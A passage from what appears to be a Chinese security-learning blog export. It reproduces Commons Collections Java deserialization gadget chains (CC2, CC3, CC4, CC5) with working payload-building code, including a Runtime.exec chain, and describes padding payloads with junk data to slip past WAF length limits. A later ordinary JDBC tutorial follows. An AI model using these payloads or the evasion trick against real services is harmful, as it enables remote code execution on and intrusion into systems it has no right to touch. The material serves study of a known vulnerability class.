class="line">        <span class="comment">/*templates.newTransformer();*/</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer.transforme如什么对象就返回什么对象,刚好在链式调用里面做开头参数</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">123</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,String&gt; map1=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Class&lt;? extends Map&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        Field factory = lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        factory.set(lazyMap,Chainedtransform);</span><br><span class="line">        <span class="comment">/*SerializeTest.serialize(map);*/</span></span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以说在这条链里面,最重要的还是前面的transformer方法导致的任意类方法调用</p>
<p>再往上找,找到一个叫<code>TrAXFilter</code>的类的构造方法中调用了newTransformer,但是这个类是不可序列化的,所以需要改装,比如说找一个类中的<code>transform</code>方法,这个方法可以调用传入的对象的构造方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220314173150015.png" alt="image-20220314173150015"></p>
<p>还真有一个这样的类<code>InstantiateTransformer</code>并且它是可以序列化的,它的<code>transform</code>方法调用是Class子类的构造方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220314175651000.png" alt="image-20220314175651000"></p>
<p>对代码稍作修改,就可以实现和InvokeTransformer相同的效果了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="comment">//ConstantTransformer.transformer传什么对象就返回什么对象,刚好在链式调用里面做开头参数</span></span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h3><p><strong>commons-collections4.0中的</strong></p>
<p>首先根据<code>transform</code>方法找调用<code>transform</code>方法的类,找到一个<code>TransformingComparator</code>类,并且该类实现了<code>serializeable</code>接口可序列化,它里面的<code>compare</code>方法调用了<code>transfom</code>方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220315233629253.png" alt="image-20220315233629253"></p>
<p>接着找一个类的<code>readObject</code>方法调用compare方法</p>
<p>有一个<code>PriorityQueue</code>类</p>
<p>根据调用链先尝试序列化,报错</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220316001101815.png" alt="image-20220316001101815"></p>
<p>找到原因是<code>InstantiateTransformer</code>类在commons-collection4.4版本中取消了对Serializeable接口的继承,让其无法反序列化</p>
<p>还是先把cc版本切换为4.0跟着复现把…..</p>
<p>按照一步步添加进去进行反序列化,发现有个问题,就是size必须大于2,因为<code>heapify</code>进行了无符号位右移是否大于0的判断</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220316003358028.png" alt="image-20220316003358028"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        </span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer&lt;&gt;(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(Chainedtransform);</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        SerializeTest.serialize(priorityQueue);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在add的时候会调用到<code>offer</code>—&gt;<code>siftUp</code>—&gt;<code>siftUpUsingComparator</code>从而调用到<code>compare</code>方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220316003551221.png" alt="image-20220316003551221"></p>
<p>所以效仿之前可以在add之前将TransformingComparator的参数随便弄一个,然后add之后再通过反射来修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer&lt;&gt;(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(<span class="keyword">new</span> ConstantTransformer&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends TransformingComparator&gt; transformingComparatorClass = transformingComparator.getClass();</span><br><span class="line">        Field transformingComparatorClassDeclaredField = transformingComparatorClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformingComparatorClassDeclaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformingComparatorClassDeclaredField.set(transformingComparator,Chainedtransform);</span><br><span class="line">        SerializeTest.serialize(priorityQueue);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结</p>
</blockquote>
<p>在学习过程中,对于java的反射,代理,接口,等等基础知识有了更深刻的理解,尤其是在抽象类的部分,也感受到了什么叫”基础不牢,地动山摇”,后序还有几条链没有复现,现在虽然都跟着做了一遍,但也仅仅是做了一遍,要是自己找反序列化链的话,估计没戏,所以接下来自己跟着思维导图,将每一种可能都模仿一层层找的方式复现一遍</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220401003902537.png" alt="image-20220401003902537"></p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><p>特点是没有用到Transformer数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">		<span class="comment">//一样是防止add直接执行代码,也可以将newTransformer方法改为toString实现同样效果</span></span><br><span class="line">        Class&lt;? extends TransformingComparator&gt; transformingComparatorClass = transformingComparator.getClass();</span><br><span class="line">        Field transformer = transformingComparatorClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        SerializeTest.serialize(priorityQueue);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><p>基本没有啥可以说的东西,我感觉是最简单的一条链了,唯一需要修改的地方就是在<code>BadAttributeValueExpException</code>的构造函数中会直接调用<code>toString</code>,需要先传递null然后等序列化之前再利用反射改回来</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220316155807311.png" alt="image-20220316155807311"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, Chainedtransform);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line">        Field val = badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">        SerializeTest.serialize(badAttributeValueExpException);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>







<h3 id="为gadget添加大量垃圾数据"><a href="#为gadget添加大量垃圾数据" class="headerlink" title="为gadget添加大量垃圾数据"></a>为gadget添加大量垃圾数据</h3><p>大多数WAF受限于性能影响，当request足够大时，WAF可能为因为性能原因作出让步，超出检查长度的内容，将不会被检查。</p>
<p>参考<a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ</a></p>
<p>通过ArrayList添加大量垃圾数据进去,因为ArrayList的<code>readObject</code>方法存在会对List中的每一项除了transient(暂时的)的所有数据序列化,所以可以利用ArrayList实现简单的垃圾数据添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList arrayList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        StringBuilder sb=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">500000</span>;i++)&#123;</span><br><span class="line">            sb.append(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        arrayList.add(sb);</span><br><span class="line">        arrayList.add(priorityQueue);</span><br><span class="line">        SerializeTest.serialize(arrayList);</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220330231216877.png" alt="image-20220330231216877"></p>
<p>生成的序列化流也十分<code>壮观</code>,鼠标滚了半天</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JDBC</title>
    <url>/2022/01/17/JDBC/</url>
    <content><![CDATA[<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>java database connectivity</p>
<p>JDBC保证了多种数据库不同操作的统一,(没有什么是加一层无法解决的哈哈哈)</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220117151840559.png" alt="image-20220117151840559" style="zoom:80%;" />

<p>需要jar包的支持:用maven导包失败了,最后手动导入了mysql的jar包</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220117154728636.png" alt="image-20220117154728636"></p>
<p>在IDEA中连接mysql数据库的时候记得设定时区timeZone为ShangHai</p>
<h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220117155711276.png" alt="image-20220117155711276"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testJdbc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置信息</span></span><br><span class="line">        <span class="comment">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class="line">        String url=<span class="string">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class="line">        String username=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//1.加载驱动,(通过反射)</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//2.连接数据库,代表数据表</span></span><br><span class="line">        Connection connection = DriverManager.getConnection(url,username,password);</span><br><span class="line">        <span class="comment">//3.向数据库发送SQL的对象Statement</span></span><br><span class="line">        <span class="comment">//此处可以使用PreparedStatement预编译,防止sql注入</span></span><br><span class="line">        Statement statement= connection.createStatement();</span><br><span class="line">        <span class="comment">//4.编写sql</span></span><br><span class="line">        String sql=(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="comment">//5.执行sql,execute的选择根据要执行的操作而异</span></span><br><span class="line">        <span class="comment">//增删改都使用executeUpdate(sql)</span></span><br><span class="line">        ResultSet resultSet = statement.executeQuery(sql);<span class="comment">//返回一个resultSet</span></span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;id=&quot;</span>+resultSet.getObject(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;name=&quot;</span>+resultSet.getObject(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;password=&quot;</span>+resultSet.getObject(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;email=&quot;</span>+resultSet.getObject(<span class="string">&quot;email&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;birthday=&quot;</span>+resultSet.getObject(<span class="string">&quot;birthday&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//6.关闭连接,释放资源(先开后关)</span></span><br><span class="line">        resultSet.close();</span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220117155700032.png" alt="image-20220117155700032"></p>
<h5 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h5><p>可以防止sql注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql=<span class="string">&quot;insert into users(id,name,password,email,birthday) values (?,?,?,?,?)&quot;</span>;</span><br><span class="line">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class="line">        preparedStatement.setInt(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        preparedStatement.setString(<span class="number">2</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">		.........................................</span><br><span class="line">        preparedStatement.executeUpdate(sql);</span><br></pre></td></tr></table></figure>

<h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>要么都成功,要么都失败</p>
<p>ACID原则:保证数据的安全</p>
<p>开启事务</p>
<p>事务提交    commit()</p>
<p>事务回滚    rollback()</p>
<p>关闭事务</p>
<p>例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">转账:A和B</span><br><span class="line"></span><br><span class="line">如果A转账100给B,那么如果A-100和B+100就要绑定成一个事务,防止数据出现问题</span><br><span class="line">start transaction ;#开启事务</span><br><span class="line">update account set money=money-100 where name=&#x27;A&#x27;;</span><br><span class="line">update account set money=money+100 where name=&#x27;B&#x27;;</span><br><span class="line">commit ;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.test;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Connection connection=<span class="keyword">null</span>;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//配置信息</span></span><br><span class="line">        <span class="comment">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class="line">        String username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.加载驱动,通过反射</span></span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="comment">//2.连接数据库,代表数据表</span></span><br><span class="line">            connection = DriverManager.getConnection(url, username, password);</span><br><span class="line">            <span class="comment">//3.通知数据库开启事务,false 开启</span></span><br><span class="line">            connection.setAutoCommit(<span class="keyword">false</span>);</span><br><span class="line">            String sql1 = <span class="string">&quot;update account set money=money-100 where name=&#x27;A&#x27;&quot;</span>;</span><br><span class="line">            connection.prepareStatement(sql1).executeUpdate();</span><br><span class="line">            <span class="comment">//制造错误</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            String sql2 = <span class="string">&quot;update account set money=money+100 where name=&#x27;B&#x27;&quot;</span>;</span><br><span class="line">            connection.prepareStatement(sql2).executeUpdate();</span><br><span class="line">            <span class="comment">//上面两条都执行成功了,才能提交事务</span></span><br><span class="line">            connection.commit();</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//如果出现异常,就通知数据库回滚事务</span></span><br><span class="line">                connection.rollback();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Junit单元测试"><a href="#Junit单元测试" class="headerlink" title="Junit单元测试"></a>Junit单元测试</h4><p>依赖,pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h5><p>@Test注解只在方法上有效,只要加了个这个注解的方法,就可以直接运行,不需要写main了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.test;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP正则绕过总结</title>
    <url>/2022/01/21/PHP%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
